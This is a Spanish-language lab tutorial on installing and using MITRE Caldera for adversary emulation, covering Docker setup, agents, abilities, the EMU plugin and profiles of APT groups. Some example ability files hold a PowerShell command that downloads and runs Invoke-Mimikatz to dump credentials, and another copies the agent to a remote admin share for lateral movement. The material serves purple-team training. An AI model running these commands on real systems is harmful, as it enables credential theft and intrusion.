---
title: Tema 05 - Caldera Framework - Emulación de Adversarios con MITRE ATT&CK
date: 2025-11-22 08:00:00 -0500
categories: [Laboratorios, MITRE]
tags: [caldera, emulación-adversaria, purple-team, mitre-attack, red-team, blue-team, cybersecurity]
---

**ENLACES DE LA GRABACIÓN DE LA CLASE**: Clase 05 - Caldera Framework

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">0. Introducción a Caldera Framework</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### ¿Qué es MITRE Caldera?

**Caldera** es una plataforma de ciberseguridad desarrollada por **MITRE Corporation** diseñada para automatizar la emulación de adversarios, asistir a equipos rojos (Red Teams) manuales y automatizar la respuesta a incidentes. Se trata de un proyecto de investigación activo que permite a los profesionales de seguridad simular ataques realistas basados en el framework **MITRE ATT&CK**.

### Características principales

- **Emulación de adversarios automatizada**: Ejecuta cadenas de ataque completas de manera autónoma
- **Framework MITRE ATT&CK integrado**: Todas las técnicas están mapeadas a tácticas y técnicas ATT&CK
- **Plataforma modular**: Sistema de plugins que expande las capacidades del núcleo
- **Interfaz web intuitiva**: Control completo a través de navegador web
- **API REST**: Automatización y integración con otras herramientas de seguridad
- **Código abierto**: Disponible gratuitamente para uso educativo y profesional

### Relación con MITRE ATT&CK

**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) es una base de conocimiento globalmente accesible de tácticas y técnicas adversarias basadas en observaciones del mundo real. Caldera utiliza este framework para:

1. **Mapear cada acción**: Cada habilidad (ability) en Caldera corresponde a una técnica ATT&CK específica (ejemplo: T1003.001, T1059.001)
2. **Simular adversarios reales**: Perfiles de adversarios que replican grupos APT documentados
3. **Validar defensas**: Probar la detección de controles de seguridad contra técnicas conocidas
4. **Educar equipos**: Entrenar a profesionales en tácticas, técnicas y procedimientos (TTPs) reales

### Componentes principales de Caldera

| Componente                    | Descripción                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------- |
| **Agentes**                   | Implantes C2 desplegados en sistemas objetivo que ejecutan comandos                                   |
| **Habilidades (Abilities)**   | Técnicas individuales ATT&CK que pueden ejecutarse (ejemplo: escaneo de red, dumping de credenciales) |
| **Adversarios**               | Perfiles de ataque que definen secuencias de habilidades a ejecutar                                   |
| **Operaciones**               | Campañas de ataque en vivo que ejecutan perfiles de adversarios contra agentes desplegados            |
| **Planificadores (Planners)** | Lógica que determina cómo y cuándo ejecutar habilidades                                               |
| **Fuentes (Sources)**         | Conocimiento inicial sobre el entorno objetivo                                                        |
| **Plugins**                   | Módulos que extienden las capacidades de Caldera                                                      |

### Casos de uso en ciberseguridad

#### 1. Entrenamiento de Purple Team
Ejercicios coordinados donde el equipo rojo ejecuta ataques y el equipo azul practica la detección y respuesta.

#### 2. Validación de controles de seguridad
Verificar que EDR, SIEM y otras soluciones de seguridad detectan técnicas específicas de ATT&CK.

#### 3. Ingeniería de detección
Generar tráfico malicioso conocido para desarrollar y validar reglas de detección (Sigma, YARA, Snort).

#### 4. Educación en ciberseguridad
Plataforma práctica para enseñar tácticas, técnicas y procedimientos de atacantes reales.

#### 5. Red Team automation
Automatizar tareas repetitivas durante compromisos de red team, liberando tiempo para actividades más complejas.

### Versión utilizada en este laboratorio

Esta guía utiliza **Caldera 5.3.0**, la versión más reciente al momento de la escritura. Esta versión incluye:

- 162 habilidades distribuidas en 11 tácticas ATT&CK
- Soporte para Windows, Linux y macOS
- Plugin EMU con planes de emulación CTID (APT29, FIN7, Wizard Spider, etc.)
- Integración con Atomic Red Team
- Interfaz VueJS renovada

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">1. Instalación de Caldera Framework</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Requisitos del sistema

#### Requisitos de hardware
- **RAM**: Mínimo 8GB (recomendado 16GB para operaciones complejas)
- **CPU**: Mínimo 2 núcleos
- **Espacio en disco**: 5GB libres

#### Requisitos de software
- **Python**: 3.10 o superior (con pip3)
- **Sistema operativo**: Linux, macOS o Windows (WSL recomendado)
- **GoLang**: 1.24+ (opcional, para compilar agentes personalizados)
- **NodeJS**: v16+ (opcional, para desarrollo de la interfaz)
- **Docker**: 20.10+ (si se usa instalación con contenedores)

### Método 1: Instalación con Docker (Recomendado para laboratorios)

Docker proporciona la forma más rápida y consistente de ejecutar Caldera, ideal para entornos educativos.

#### Opción A: Usar imagen pre-construida

```bash
# Descargar y ejecutar la imagen oficial de Caldera
docker run -p 8888:8888 ghcr.io/mitre/caldera:latest
```

#### Opción B: Construir imagen local

```bash
# Clonar el repositorio
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Construir imagen Docker (variante completa)
docker build --build-arg VARIANT=full -t caldera .

# Ejecutar contenedor
docker run -it -p 8888:8888 caldera
```

#### Variantes de Docker disponibles

- **full**: Incluye todos los archivos para uso offline (plugins emu y atomic completos)
- **slim**: Descarga datos de emu/atomic bajo demanda (imagen más pequeña)

#### Puertos expuestos por defecto

| Puerto | Protocolo | Uso                                   |
| ------ | --------- | ------------------------------------- |
| 8888   | HTTP      | Interfaz web y beacons de agentes     |
| 8443   | HTTPS     | Interfaz segura (requiere plugin SSL) |
| 7010   | TCP       | Canal C2 TCP                          |
| 7011   | UDP       | Canal C2 UDP                          |
| 7012   | WebSocket | Canal C2 WebSocket                    |
| 8853   | DNS       | Túnel DNS C2                          |
| 2222   | FTP       | Canal C2 FTP                          |
| 8022   | SSH       | Túnel SSH                             |

#### Persistencia de datos con Docker

Por defecto, los datos en Docker son efímeros. Para mantener operaciones y configuraciones:

```bash
# Crear volumen para persistencia
docker volume create caldera-data

# Ejecutar con volumen montado
docker run -it \
  -p 8888:8888 \
  -v caldera-data:/usr/src/app/data \
  ghcr.io/mitre/caldera:latest
```

#### Configuración personalizada con Docker

```bash
# Montar archivo de configuración personalizado
docker run -it \
  -p 8888:8888 \
  -v $(pwd)/mi-config.yml:/usr/src/app/conf/local.yml \
  ghcr.io/mitre/caldera:latest
```

### Método 2: Instalación local (Desarrollo y personalización)

La instalación local proporciona mayor flexibilidad para personalizar Caldera y desarrollar plugins.

#### Paso 1: Preparar entorno virtual de Python

```bash
# Crear entorno virtual (recomendado)
python3 -m venv .calderavenv

# Activar entorno virtual
source .calderavenv/bin/activate  # Linux/macOS
# .calderavenv\Scripts\activate   # Windows
```

#### Paso 2: Clonar repositorio

```bash
# Clonar con submódulos (importante: incluye plugins)
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
```

#### Paso 3: Instalar dependencias

```bash
# Instalar dependencias de Python
pip3 install -r requirements.txt
```

#### Dependencias principales instaladas

- `aiohttp==3.12.14` - Servidor HTTP asíncrono
- `jinja2==3.1.6` - Motor de plantillas
- `pyyaml==6.0.1` - Procesamiento de configuración
- `cryptography==44.0.1` - Cifrado de comunicaciones
- `websockets==15.0` - Comunicación con agentes
- `marshmallow==3.20.1` - Serialización de datos

#### Paso 4: Iniciar servidor Caldera

```bash
# Primera ejecución (construye interfaz VueJS)
python3 server.py --insecure --build

# Ejecuciones posteriores
python3 server.py --insecure
```

#### Opciones de línea de comandos

```bash
python3 server.py --help

Opciones disponibles:
  --insecure        Usar configuración por defecto (credenciales red/admin)
  --build           Construir interfaz VueJS (requerido en primera ejecución)
  --log LEVEL       Nivel de logging (DEBUG, INFO, WARNING, ERROR, CRITICAL)
  --fresh           Eliminar object_store al iniciar (reseteo completo)
  -P PLUGINS        Iniciar con plugins específicos
```

### Verificación de la instalación

#### Acceder a la interfaz web

1. Abrir navegador web
2. Navegar a: `http://localhost:8888`
3. Iniciar sesión con credenciales por defecto (modo insecure):
   - **Usuario**: `red` o `admin`
   - **Contraseña**: `admin`
   - **Usuario Blue Team**: `blue` / `admin`

#### Verificar plugins cargados

En la interfaz web:
1. Hacer clic en el menú lateral
2. Navegar a **Plugins**
3. Verificar que los plugins estén cargados:
   - ✓ Sandcat (agente por defecto)
   - ✓ Stockpile (habilidades y adversarios)
   - ✓ Training (curso de certificación)
   - ✓ Magma (interfaz VueJS)
   - ✓ Emu (emulación de adversarios reales)
   - ✓ Atomic (Atomic Red Team)
   - ✓ Y otros plugins habilitados

### Consideraciones de seguridad

> ⚠️ **ADVERTENCIA DE SEGURIDAD**
>
> El equipo de Caldera recomienda encarecidamente ejecutar el servidor en un entorno seguro/red aislada, sin exposición a Internet. La interfaz web de Caldera no tiene una aplicación web endurecida y exhaustivamente probada con pentesting, sino solo características básicas de autenticación y seguridad.

#### Mejores prácticas para laboratorios educativos

1. **Red aislada**: Ejecutar Caldera en red de laboratorio sin conexión a Internet
2. **Modo insecure solo para entrenamiento**: Usar `--insecure` únicamente en entornos controlados
3. **Segmentación de red**: Aislar sistemas objetivo de redes de producción
4. **Máquinas virtuales**: Usar VMs o contenedores para sistemas objetivo
5. **Documentación de ejercicios**: Registrar todas las actividades para cumplimiento
6. **Monitoreo**: Supervisar actividad de agentes durante ejercicios

#### Configuración de producción

Para entornos de producción, NO usar el flag `--insecure`:

```bash
# Primera ejecución: genera conf/local.yml con configuración segura
python3 server.py --build

# El servidor solicitará:
# - Nueva contraseña de administrador
# - Clave de cifrado personalizada
# - Configuración de red
```

Luego editar `/conf/local.yml` para personalizar:
- Credenciales de usuario
- API keys
- Claves de cifrado
- Certificados SSL (con plugin SSL)

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">2. Conceptos fundamentales de Caldera</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Arquitectura general

Caldera sigue una arquitectura cliente-servidor de comando y control (C2):

```
┌─────────────────────────────────────────────────────────────┐
│                    Operador (Navegador Web)                 │
│                    http://localhost:8888                    │
└────────────────────────────┬────────────────────────────────┘
                             │ HTTPS/API REST
┌────────────────────────────▼─────────────────────────────────┐
│                     Servidor Caldera                         │
│  ┌──────────┐  ┌───────────┐  ┌───────────┐  ┌─────────────┐ │
│  │ Agentes  │  │Adversarios│  │Habilidades│  │Planificador │ │
│  └──────────┘  └───────────┘  └───────────┘  └─────────────┘ │
│  ┌───────────┐  ┌──────────┐  ┌──────────┐                   │
│  │Operaciones│  │  Fuentes │  │  Plugins │                   │
│  └───────────┘  └──────────┘  └──────────┘                   │
└────────────────────────────┬─────────────────────────────────┘
                             │ C2 Channels (HTTP/TCP/DNS/etc)
         ┌───────────────────┼───────────────────┐
         │                   │                   │
┌────────▼────────┐  ┌───────▼────────┐  ┌──────▼─────────┐
│  Agente Sandcat │  │ Agente Sandcat │  │ Agente Sandcat │
│   (Windows)     │  │    (Linux)     │  │    (macOS)     │
│ 192.168.1.10    │  │ 192.168.1.20   │  │ 192.168.1.30   │
└─────────────────┘  └────────────────┘  └────────────────┘
```

### Agentes (Agents)

Los **agentes** son implantes de comando y control (C2) que se despliegan en sistemas objetivo. Actúan como "pies en el suelo" que ejecutan comandos enviados por el servidor Caldera.

#### Agente por defecto: Sandcat

**Sandcat** es el agente predeterminado de Caldera con las siguientes características:

- **Lenguaje**: Escrito en GoLang (compilado estáticamente)
- **Multiplataforma**: Soporta Windows, Linux y macOS
- **Canales C2**: HTTP/HTTPS, TCP, UDP, WebSocket, DNS, SSH, FTP
- **Ejecutores**: PowerShell, CMD, Bash, SH, PowerShell Core
- **Tamaño**: ~7-10MB (incluye runtime de Go)
- **Ofuscación**: Nombre de proceso personalizable (por defecto: `splunkd`)

#### Propiedades de un agente

| Propiedad     | Descripción                                                   |
| ------------- | ------------------------------------------------------------- |
| **PAW**       | Identificador único del agente (generado automáticamente)     |
| **Hostname**  | Nombre del sistema comprometido                               |
| **Platform**  | Sistema operativo (windows, linux, darwin)                    |
| **Executors** | Intérpretes disponibles (psh, cmd, sh, bash, pwsh)            |
| **Group**     | Agrupación lógica (ej: "red", "blue", "kali", "domain-users") |
| **Privilege** | Nivel de privilegios (User, Elevated, SYSTEM)                 |
| **Contact**   | Método C2 utilizado (HTTP, TCP, etc.)                         |
| **Sleep**     | Intervalo de beacon (tiempo entre comunicaciones)             |
| **Status**    | Estado (alive, trusted, untrusted, dead)                      |

#### Otros agentes disponibles

- **Manx**: Agente de reverse shell ligero
- **Ragdoll**: Implante basado en HTML/JavaScript

#### Configuración de agentes

Archivo: `/conf/agents.yml`

```yaml
implant_name: splunkd          # Nombre del proceso para camuflaje
sleep_min: 30                  # Intervalo mínimo de beacon (segundos)
sleep_max: 60                  # Intervalo máximo de beacon (segundos)
untrusted_timer: 90            # Tiempo antes de marcar agente como no confiable
watchdog: 0                    # Temporizador de auto-terminación (0=deshabilitado)
```

### Habilidades (Abilities)

Las **habilidades** son técnicas individuales de ATT&CK que pueden ejecutarse en sistemas objetivo. Cada habilidad representa una acción específica como escanear la red, dumping de credenciales, o exfiltración de datos.

#### Estructura de una habilidad

Archivo de ejemplo: `/plugins/stockpile/data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml`

```yaml
id: 85341c8c-4ecb-4579-8f53-43e3e91d7617
name: Collect ARP details
description: Localizar todas las IPs y FQDNs activos en la red
tactic: discovery
technique:
  attack_id: T1018
  name: Remote System Discovery
platforms:
  darwin:
    sh:
      command: arp -a
      parsers:
        plugins.stockpile.app.parsers.ipaddr:
          - source: remote.host.ip
  linux:
    sh:
      command: arp -a
  windows:
    psh,cmd:
      command: arp -a
```

#### Componentes de una habilidad

1. **ID**: Identificador único UUID
2. **Name**: Nombre descriptivo
3. **Description**: Explicación de la acción
4. **Tactic**: Táctica ATT&CK (discovery, credential-access, etc.)
5. **Technique**: Técnica ATT&CK específica (T1018, T1003.001, etc.)
6. **Platforms**: Comandos específicos por plataforma
7. **Parsers**: Extracción de datos (facts) de la salida del comando
8. **Cleanup**: Comandos opcionales para limpiar artefactos

#### Tácticas ATT&CK cubiertas en Caldera

Caldera incluye 162 habilidades distribuidas en 11 tácticas:

1. **Collection** - Recolección de datos del objetivo
2. **Command-and-Control** - Comunicaciones C2
3. **Credential-Access** - Obtención de credenciales
4. **Defense-Evasion** - Evasión de defensas
5. **Discovery** - Reconocimiento del entorno
6. **Execution** - Ejecución de código
7. **Exfiltration** - Extracción de datos
8. **Impact** - Impacto destructivo
9. **Lateral-Movement** - Movimiento lateral
10. **Persistence** - Persistencia en el sistema
11. **Privilege-Escalation** - Escalación de privilegios

#### Ejemplo: Habilidad de Credential Access (T1003.001)

```yaml
name: Run PowerKatz
description: Usar powerkatz para ejecutar mimikatz y extraer credenciales
tactic: credential-access
technique:
  attack_id: T1003.001
  name: OS Credential Dumping - LSASS Memory
platforms:
  windows:
    psh:
      command: |
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
        $web = (New-Object System.Net.WebClient);
        $result = $web.DownloadString("https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1");
        iex $result; Invoke-Mimikatz -DumpCreds
```

#### Ejemplo: Habilidad de Lateral Movement (T1021.002)

```yaml
name: Copy 54ndc47 (SMB)
description: Copiar agente 54ndc47 a host remoto vía SMB
tactic: lateral-movement
technique:
  attack_id: T1021.002
  name: Remote Services - SMB/Windows Admin Shares
platforms:
  windows:
    psh:
      command: |
        $path = "sandcat.go-windows";
        $drive = "\\#{remote.host.fqdn}\C$";
        Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
      cleanup: |
        Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
```

### Adversarios (Adversaries)

Los **adversarios** son perfiles de ataque que definen secuencias de habilidades a ejecutar. Representan campañas completas de atacantes o grupos APT.

#### Estructura de un adversario

Archivo: `/plugins/stockpile/data/adversaries/de07f52d-9928-4071-9142-cb1d3bd851e8.yml`

```yaml
id: de07f52d-9928-4071-9142-cb1d3bd851e8
name: Ransack
description: Descubrir detalles del host y robar archivos sensibles
atomic_ordering:
  - 90c2efaa-8205-480d-8bb6-61d90dbaf81b  # Buscar archivos sensibles
  - c0da588f-79f0-4263-8998-7496b1a40596  # Usuario activo
  - c1cd6388-3ced-48c7-a511-0434c6ba8f48  # Usuarios locales
  - 85341c8c-4ecb-4579-8f53-43e3e91d7617  # Detalles ARP
  - b6b105b9-41dc-490b-bc5c-80d699b82ce8  # Información de red
  # ... más habilidades
```

#### Adversarios disponibles en Stockpile

- **Ransack**: Descubrimiento y exfiltración de datos (18 pasos)
- **Advanced Thief via DropBox**: Búsqueda, staging y exfiltración de archivos
- **Check**: Verificación de configuración de plataforma

#### Adversarios del mundo real (Plugin EMU)

El plugin EMU proporciona planes de emulación CTID de grupos APT reales:

- **APT29** (Cozy Bear)
- **Carbanak** (Financial cybercrime)
- **FIN6** (Payment card theft)
- **FIN7** (Carbanak-like financial attacks)
- **Menu Pass** (APT10, Stone Panda)
- **Wizard Spider** (Trickbot, Ryuk ransomware)
- **OilRig** (APT34, Helix Kitten)

### Operaciones (Operations)

Las **operaciones** son campañas de ataque en vivo que ejecutan perfiles de adversarios contra agentes desplegados.

#### Propiedades de una operación

| Propiedad      | Descripción                                         |
| -------------- | --------------------------------------------------- |
| **Name**       | Nombre identificador de la operación                |
| **Adversary**  | Perfil de adversario a ejecutar                     |
| **Group**      | Grupo de agentes objetivo                           |
| **Planner**    | Lógica de ejecución (atomic, batch, buckets)        |
| **Source**     | Conocimiento inicial (facts) sobre el objetivo      |
| **Autonomous** | Modo: 1 (automático) o 0 (manual paso a paso)       |
| **Obfuscator** | Método de ofuscación de comandos                    |
| **Jitter**     | Aleatorización de beacons (ej: "2/8" = ±2 segundos) |
| **State**      | Estado actual (running, paused, finished, cleanup)  |

#### Estados de una operación

- **running**: Ejecutando habilidades activamente
- **paused**: Pausada por el operador
- **run_one_link**: Ejecutar solo siguiente habilidad (modo manual)
- **out_of_time**: Tiempo agotado
- **finished**: Completada exitosamente
- **cleanup**: Ejecutando comandos de limpieza

### Planificadores (Planners)

Los **planificadores** determinan la lógica de ejecución de habilidades durante una operación.

#### Atomic Planner (Por defecto)

Ejecuta habilidades secuencialmente:
1. Espera a que una habilidad complete antes de la siguiente
2. Procesa basándose en el `atomic_ordering` del adversario
3. Ejemplo: Agente A ejecuta (A1 → A2 → A3) mientras Agente B ejecuta (B1 → B2 → B3) en paralelo

#### Otros planificadores

- **Batch Planner**: Ejecuta múltiples habilidades en paralelo
- **Buckets Planner**: Agrupa habilidades por táctica ATT&CK

### Fuentes (Sources) y Hechos (Facts)

Las **fuentes** proporcionan conocimiento inicial sobre el entorno objetivo que las habilidades pueden utilizar.

#### Ejemplo de fuente

Archivo: `/data/sources/8dcbdf42-f53a-49c9-8e7d-a8d7ad44b25b.yml`

```yaml
id: 8dcbdf42-f53a-49c9-8e7d-a8d7ad44b25b
name: OilRig (Emu)
facts:
  - trait: initial.target.user
    value: gosta
  - trait: initial.target.password
    value: Bl1nk182@g
  - trait: network.domain.name
    value: boombox.local
  - trait: caldera.server.ip
    value: 192.168.10.4
```

#### ¿Cómo funcionan los facts?

Los facts permiten que las habilidades se encadenen:

1. **Habilidad 1** ejecuta escaneo ARP → descubre `remote.host.ip: 192.168.1.50`
2. **Habilidad 2** usa `#{remote.host.ip}` para copiar archivo vía SMB
3. **Habilidad 3** usa `#{remote.host.ip}` para ejecutar comando remoto

### Sistema de plugins

Caldera utiliza una arquitectura modular donde los plugins extienden la funcionalidad del núcleo.

#### Plugins incluidos por defecto

| Plugin          | Descripción                                  |
| --------------- | -------------------------------------------- |
| **Sandcat**     | Agente C2 por defecto (GoLang)               |
| **Stockpile**   | 162 habilidades y perfiles de adversarios    |
| **Training**    | Curso de certificación integrado             |
| **Magma**       | Interfaz web VueJS                           |
| **Emu**         | Planes de emulación CTID (APT29, FIN7, etc.) |
| **Atomic**      | Integración con Atomic Red Team              |
| **Compass**     | Visualizaciones ATT&CK Navigator             |
| **Debrief**     | Reportes de operaciones                      |
| **Fieldmanual** | Documentación integrada                      |
| **GameBoard**   | Visualización conjunta red/blue team         |
| **Human**       | Simulación de ruido de endpoint              |
| **Manx**        | Agente de reverse shell                      |
| **Response**    | Automatización de respuesta a incidentes     |
| **Access**      | Herramientas de acceso inicial               |
| **Builder**     | Compilación dinámica de payloads             |

#### Habilitación de plugins

Archivo: `/conf/default.yml`

```yaml
plugins:
  - access
  - atomic
  - compass
  - debrief
  - emu
  - fieldmanual
  - gameboard
  - human
  - manx
  - response
  - sandcat
  - stockpile
  - training
```

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">3. Plugin EMU - Emulación de adversarios del mundo real</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### ¿Qué es el Plugin EMU?

El **plugin EMU** (Emulation) es uno de los componentes más poderosos de Caldera, diseñado para proporcionar **planes de emulación de adversarios del mundo real** desarrollados por el **Center for Threat-Informed Defense (CTID)** de MITRE.

A diferencia de los adversarios básicos del plugin Stockpile, EMU permite simular campañas completas de **grupos APT (Advanced Persistent Threat)** documentados, replicando sus tácticas, técnicas y procedimientos (TTPs) desde el acceso inicial hasta la exfiltración de datos.

### Características principales

- **11 planes de emulación completa** de grupos APT reales
- **12 planes de micro-emulación** para comportamientos compuestos específicos
- **Basado en inteligencia de amenazas real** documentada públicamente
- **Payloads y herramientas auténticas** utilizadas por los adversarios
- **Escenarios multi-etapa** que replican campañas reales de ataque

### Diferencia entre emulación completa y micro-emulación

#### Full Emulation Plans (Planes de emulación completa)

Representan campañas completas de adversarios específicos, desde acceso inicial hasta exfiltración:

- **Cobertura**: Múltiples tácticas ATT&CK (8-12 tácticas)
- **Duración**: Operaciones de 1-4 horas
- **Complejidad**: Requieren infraestructura específica
- **Objetivo**: Simular un breach completo de un adversario específico

#### Micro Emulation Plans (Planes de micro-emulación)

Enfoques focalizados en comportamientos compuestos específicos vistos en múltiples adversarios:

- **Cobertura**: 1-3 técnicas ATT&CK relacionadas
- **Duración**: Operaciones de 5-15 minutos
- **Complejidad**: Mínima infraestructura requerida
- **Objetivo**: Validar detección de comportamientos específicos

### Instalación del Plugin EMU

El plugin EMU viene incluido con Caldera pero requiere configuración adicional para descargar los planes de emulación y payloads.

#### Paso 1: Habilitar el plugin

Editar el archivo de configuración `/conf/default.yml` o `/conf/local.yml`:

```yaml
plugins:
  - emu
  - sandcat
  - stockpile
  # ... otros plugins
```

**Nota**: En modo `--insecure`, EMU ya está habilitado por defecto en `conf/default.yml`.

#### Paso 2: Primera ejecución para descargar biblioteca

```bash
# Iniciar Caldera (primera vez con EMU)
python3 server.py --insecure --build

# Observar logs - Caldera descargará automáticamente:
# - Adversary Emulation Library desde GitHub
# - Planes de emulación CTID
# - Estructura de abilities y sources

# Esperar a que termine la descarga (~2-5 minutos)
# La biblioteca se almacena en: plugins/emu/data/adversary-emulation-plans/
```

#### Paso 3: Detener Caldera temporalmente

```bash
# Detener el servidor con Ctrl+C
^C
```

#### Paso 4: Instalar dependencias de Python

Algunos payloads en la biblioteca están cifrados y requieren `pyminizip` para desencriptación automática:

```bash
# En Ubuntu/Debian
sudo apt-get install zlib1g

# En macOS
brew install zlib

# Instalar dependencia Python
pip3 install -r plugins/emu/requirements.txt
```

Contenido de `plugins/emu/requirements.txt`:
```
pyminizip==0.2.6
```

#### Paso 5: Descargar payloads adicionales

Algunos payloads no pueden redistribuirse por licencia (ejemplo: Sysinternals) y deben descargarse manualmente:

```bash
# Navegar al directorio del plugin EMU
cd plugins/emu/

# Ejecutar script de descarga de payloads
./download_payloads.sh
```

**Payloads descargados por el script**:

| Payload              | Uso                                                        |
| -------------------- | ---------------------------------------------------------- |
| **AdFind.exe**       | Enumeración de Active Directory (usado por múltiples APTs) |
| **NetSess.exe**      | Enumeración de sesiones de red                             |
| **nbtscan.exe**      | Escaneo NetBIOS                                            |
| **PsExec.exe**       | Ejecución remota (movimiento lateral)                      |
| **mimikatz.exe**     | Dumping de credenciales                                    |
| **WCE**              | Windows Credential Editor                                  |
| **Putty/Plink/PSCP** | Túneles SSH y transferencia de archivos                    |
| **dnscat2.ps1**      | Túnel DNS C2                                               |

**Importante**: Este script descarga herramientas de hacking reales. Solo ejecutar en entornos aislados de laboratorio.

#### Paso 6: Reiniciar Caldera

```bash
# Volver al directorio raíz de Caldera
cd ../..

# Reiniciar servidor
python3 server.py --insecure

# Verificar que EMU está cargado
# En logs debe aparecer: "[*] Plugin EMU loaded successfully"
```

#### Paso 7: Verificar instalación en interfaz web

1. Acceder a `http://localhost:8888`
2. Hacer clic en **"Adversaries"** en el menú lateral
3. Buscar adversarios con etiqueta **(Emu)**:
   - APT29
   - Carbanak
   - FIN6
   - FIN7
   - menuPass
   - OceanLotus
   - OilRig
   - Sandworm
   - Turla
   - Wizard Spider
   - Blind Eagle

### Estructura del Plugin EMU

#### Directorios principales

```
plugins/emu/
├── data/
│   ├── adversary-emulation-plans/    # Biblioteca CTID
│   │   ├── apt29/                    # Plan de APT29
│   │   ├── carbanak/                 # Plan de Carbanak
│   │   ├── fin6/                     # Plan de FIN6
│   │   ├── fin7/                     # Plan de FIN7
│   │   ├── menu_pass/                # Plan de menuPass (APT10)
│   │   ├── ocean_lotus/              # Plan de OceanLotus (APT32)
│   │   ├── oilrig/                   # Plan de OilRig (APT34)
│   │   ├── sandworm/                 # Plan de Sandworm
│   │   ├── turla/                    # Plan de Turla
│   │   ├── wizard_spider/            # Plan de Wizard Spider
│   │   ├── blind_eagle/              # Plan de Blind Eagle
│   │   └── micro_emulation_plans/    # Planes micro
│   ├── abilities/                    # Habilidades generadas de planes
│   ├── adversaries/                  # Adversarios (YAML)
│   └── sources/                      # Facts iniciales por adversario
├── payloads/                         # Payloads descargados
└── download_payloads.sh              # Script de descarga
```

### Adversarios disponibles (Full Emulation)

#### 1. APT29 (Cozy Bear, The Dukes)

| Atribución              | Rusia (posiblemente SVR)                                |
| ----------------------- | ------------------------------------------------------- |
| **Motivación**          | Espionaje cibernético, recopilación de inteligencia     |
| **Objetivos**           | Gobiernos, think tanks, organizaciones de investigación |
| **Técnicas destacadas** | Spearphishing, WMI, PowerShell, webshells               |
| **Escenarios**          | 2 escenarios de emulación completa                      |

**Descripción**: APT29 es un actor de amenaza organizado y bien financiado cuyos objetivos de recopilación parecen alinearse con los intereses de la Federación Rusa. Conocido por sofisticación técnica y uso extensivo de herramientas LOLBAS (Living Off The Land).

#### 2. Carbanak (Carbanak Group)

| Atribución              | Crimen organizado (Europa del Este)                                                  |
| ----------------------- | ------------------------------------------------------------------------------------ |
| **Motivación**          | Ganancia financiera                                                                  |
| **Objetivos**           | Bancos, instituciones financieras, cajeros automáticos                               |
| **Técnicas destacadas** | Malware Carbanak, manipulación de cajeros ATM, movimiento lateral en redes bancarias |
| **Escenarios**          | 2 escenarios de emulación                                                            |

**Descripción**: Carbanak es un grupo de amenaza que ha sido identificado manipulando activos financieros, como transferir fondos desde cuentas bancarias o tomar control de infraestructuras de cajeros automáticos.

#### 3. FIN6

| Atribución              | Grupo de cibercrimen (posiblemente Rusia/Europa del Este)                  |
| ----------------------- | -------------------------------------------------------------------------- |
| **Motivación**          | Ganancia financiera - robo de datos de tarjetas de pago                    |
| **Objetivos**           | Retail, hospitalidad, sistemas POS de alto volumen                         |
| **Técnicas destacadas** | Compromiso de sistemas POS, scraping de memoria, Metasploit, Cobalt Strike |
| **Fases**               | 2 fases documentadas                                                       |

**Descripción**: FIN6 se considera un grupo motivado financieramente. El grupo ha apuntado agresivamente y comprometido sistemas POS de alto volumen en los sectores de hospitalidad y retail desde al menos 2015.

#### 4. FIN7

| Atribución              | Grupo de cibercrimen (vinculado a Carbanak)                                                   |
| ----------------------- | --------------------------------------------------------------------------------------------- |
| **Motivación**          | Ganancia financiera - robo de datos de tarjetas de pago                                       |
| **Objetivos**           | Retail, restaurantes, sistemas de pago                                                        |
| **Técnicas destacadas** | Phishing sofisticado, backdoor Carbanak, herramientas personalizadas (BOOSTWRITE, PILLOWMINT) |
| **Escenarios**          | 2 escenarios de emulación                                                                     |

**Descripción**: FIN7 es un grupo de amenaza motivado financieramente asociado con operaciones maliciosas que datan de finales de 2015. El grupo se caracteriza por su targeting persistente y robo a gran escala de datos de tarjetas de pago de sistemas víctimas.

#### 5. menuPass (APT10, Stone Panda, Cloud Hopper)

| Atribución              | China (MSS - Ministerio de Seguridad del Estado)                                    |
| ----------------------- | ----------------------------------------------------------------------------------- |
| **Motivación**          | Espionaje cibernético                                                               |
| **Objetivos**           | MSPs (Managed Service Providers), telecomunicaciones, construcción, ingeniería      |
| **Técnicas destacadas** | Compromiso de MSPs (Operación Cloud Hopper), RATs (PlugX, ChChes), DLL side-loading |

**Descripción**: menuPass se considera un grupo de amenaza motivado por objetivos de recopilación, con targeting consistente con objetivos estratégicos chinos. Famoso por la campaña "Cloud Hopper" que comprometió MSPs para acceder a sus clientes.

#### 6. OceanLotus (APT32, SeaLotus)

| Atribución              | Vietnam (posiblemente patrocinado por el estado)                                                                                    |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **Motivación**          | Espionaje cibernético                                                                                                               |
| **Objetivos**           | Corporaciones privadas en manufactura, productos de consumo, hospitalidad; gobiernos extranjeros, disidentes políticos, periodistas |
| **Técnicas destacadas** | Backdoors sofisticados, persistencia multi-capa, malware macOS/Windows                                                              |

**Descripción**: OceanLotus es un actor de amenaza cibernética que se alinea con los intereses del gobierno vietnamita. Visto por primera vez en 2012, OceanLotus apunta a corporaciones privadas en los sectores de manufactura, productos de consumo y hospitalidad.

#### 7. OilRig (APT34, Helix Kitten)

| Atribución              | Irán (MOIS - Ministerio de Inteligencia)                                                |
| ----------------------- | --------------------------------------------------------------------------------------- |
| **Motivación**          | Espionaje cibernético                                                                   |
| **Objetivos**           | Finanzas, gobierno, energía, químicos, telecomunicaciones (Medio Oriente, Europa, Asia) |
| **Técnicas destacadas** | Túneles DNS, webshells, herramientas personalizadas (QUADAGENT, HELMINTH, BONDUPDATER)  |

